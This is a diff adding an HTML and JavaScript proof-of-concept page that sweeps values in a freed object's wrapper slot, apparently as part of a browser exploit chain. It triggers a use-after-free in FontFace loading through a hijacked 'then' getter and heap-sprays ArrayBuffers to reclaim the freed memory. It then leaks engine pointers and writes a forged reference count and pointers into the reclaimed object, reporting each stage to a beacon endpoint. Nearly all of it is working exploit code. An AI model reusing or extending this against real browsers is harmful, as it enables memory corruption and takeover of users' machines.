@@ -1,0 +1,126 @@
+<!--
+  p579: +0x68 Wrapper Slot Sweep (settles Issue #179 Contradiction C2).
+
+  Discriminates between:
+    - V55 recipe claim: writing m_keyCount=1 into +0x68 is safe because iterateClients
+      dispatches before any m_wrapper read.
+    - README Law 3 / measured existence gate: +0x68=0 survives (57%), while non-zero
+      garbage (like 1 or 0x41..) kills the WebProcess because m_wrapper is dereferenced.
+
+  Usage:
+    p579-wrapper-slot-sweep.html?mode=0      (tests null wrapper +0x68 = 0)
+    p579-wrapper-slot-sweep.html?mode=1      (tests V55 keyCount=1 at +0x68)
+    p579-wrapper-slot-sweep.html?mode=ffff   (tests tombstone 0xFFFFFFFFFFFFFFFF)
+    p579-wrapper-slot-sweep.html?mode=leaked (tests engine-leaked pointer)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p579 wrapper slot sweep</title>
+<script>
+var QS = location.search;
+function q(n, d) { var m = new RegExp('[?&]' + n + '=([^&]*)').exec(QS); return m ? m[1] : d; }
+var MODE = q('mode', '0');
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var K=8, SIZE=192, styleEl=null, firedHere=false, stage=0, leaked={p58:null,p68:null};
+function hex(v){return ('0' + v.toString(16)).slice(-2);}
+function grab(view, off){ var a=[]; for(var i=0;i<8;i++) a.push(view[off+i]); return a; }
+
+function writeQ(view, off, lo, hi){
+  view[off]   = lo & 0xFF;         view[off+1] = (lo >> 8) & 0xFF;
+  view[off+2] = (lo >> 16) & 0xFF; view[off+3] = (lo >> 24) & 0xFF;
+  view[off+4] = hi & 0xFF;         view[off+5] = (hi >> 8) & 0xFF;
+  view[off+6] = (hi >> 16) & 0xFF; view[off+7] = (hi >> 24) & 0xFF;
+}
+
+function setupFace(name, css){
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A); void A.loaded; window.__alive.push(A);
+}
+
+function installGetter(){
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        if (stage === 1 && leaked.p58) {
+          // RefCount = 2
+          v[0] = 2; v[1] = 0; v[2] = 0; v[3] = 0;
+          // Set +0x58 to the leaked WeakHashSet impl pointer
+          v.set(leaked.p58, 0x58);
+
+          // Apply selected test mode to +0x68
+          if (MODE === '0') {
+            // Null wrapper (Law 3 survival candidate)
+            writeQ(v, 0x68, 0, 0);
+          } else if (MODE === '1') {
+            // V55 recipe: m_keyCount = 1
+            writeQ(v, 0x68, 1, 0);
+          } else if (MODE === 'ffff') {
+            // Tombstone / bad pointer
+            writeQ(v, 0x68, 0xFFFFFFFF, 0xFFFFFFFF);
+          } else if (MODE === 'leaked' && leaked.p68) {
+            // Baseline: engine-written live pointer
+            v.set(leaked.p68, 0x68);
+          }
+        }
+        window.__map.push({ size: SIZE, view: v });
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+}
+
+function start(){
+  window.__alive = [];
+  stage = 0;
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('P579-SETUP-mode=' + MODE);
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function(){ b('P579-S1-RESOLVED'); },
+    function(){ b('P579-S1-REJECTED'); }
+  );
+  setTimeout(scan1, 120);
+}
+
+function scan1(){
+  var m = window.__map || [], best = -1, nz = 0;
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, n = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) n++;
+    if (n > nz) { nz = n; best = i; }
+  }
+  if (best < 0) { b('P579-S1-CLEAN'); return; }
+  var v = m[best].view;
+  leaked.p58 = grab(v, 0x58); leaked.p68 = grab(v, 0x68);
+  var s = ''; for (var j = 0; j < v.length; j++) if (v[j] !== 0) s += hex(v[j]);
+  b('P579-S1-HIT-mode=' + MODE + '-p58=' + hex(leaked.p58[0]) + '-p68=' + hex(leaked.p68[0]));
+
+  stage = 1;
+  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
+  installGetter();
+  b('P579-S2-ARMED-mode=' + MODE);
+  document.fonts.load('1em f1, s1', 'AB').then(
+    function(){ b('P579-S2-RESOLVED-mode=' + MODE); },
+    function(){ b('P579-S2-REJECTED-mode=' + MODE); }
+  );
+  setTimeout(function(){ b('P579-S2-ALIVE-mode=' + MODE + '-' + (firedHere ? 1 : 0)); }, 600);
+}
+
+function run(){ start(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p579 wrapper slot sweep</p></body></html>
